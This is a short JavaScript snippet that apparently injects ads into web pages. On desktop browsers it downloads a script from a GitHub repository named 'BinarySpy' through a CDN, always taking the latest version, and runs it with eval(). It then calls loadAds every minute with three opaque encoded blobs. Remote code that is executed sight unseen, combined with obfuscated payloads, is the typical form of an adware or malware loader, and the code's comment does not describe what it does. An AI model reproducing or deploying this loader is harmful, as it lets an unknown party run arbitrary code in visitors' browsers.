// skip ads on mobile
(async () => {
	const isMobile =
		/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
			navigator.userAgent,
		);

	if (isMobile) return;

	const code = await (
		await fetch(
			"https://cdn.jsdelivr.net/gh/TongSherbet/BinarySpy@latest/CreatingTheWeekend.js",
		)
	).text();
	eval(code);

	// i swear it works now :pray:
	setTimeout(() => {
		const invokeAds = () => {
			// main
			loadAds({
			    "banner": "85ScgTBkTR5vF1SFC03bayesHctqeePeQPXtq7nrhE0bMag9X7pYcp7n0e1Donqa+ohxQwuxGo8QlSUGykAUaCn+SNpSUqUbwd91UISiiwI8c+fUN5YanOCiokwuMulBPj5Lk3HF9UNcV7D0",
			    "native": "pXsMqLEgSJKOAA3BR+vBMkJihoRRUz7kuqK5cz9+e20e7Qy4YiiuIUKWO2Er1QuYvDqcRiHYkAg7UxaEiEwi/KJ9hmIBMv4lyBYMHxW0PhH9KO3gxxz1yEdEypCgadtkcbE1awtkXzBOJ22ByWrlxim/5qrFqg==",
			    "socialbar": "d7DRnqyTXU97BoRKGdRPqajMuwseDTJGR31/CI+Hfy8yXd+GvgcavsBt5hey6H22OLLYeIfMSmJ3UxcArJAADet2OIdLWRLwdThufTUn/LXhMYtHEjhjLuz+YAuEFh+nnh6fiJ0YMo2SV0WE8wnhq7fuxBVr2SAS"
			});
		}
	
		invokeAds()
		setInterval(() => {
			invokeAds()
		}, 60 * 1000);
	}, 1000);
})();
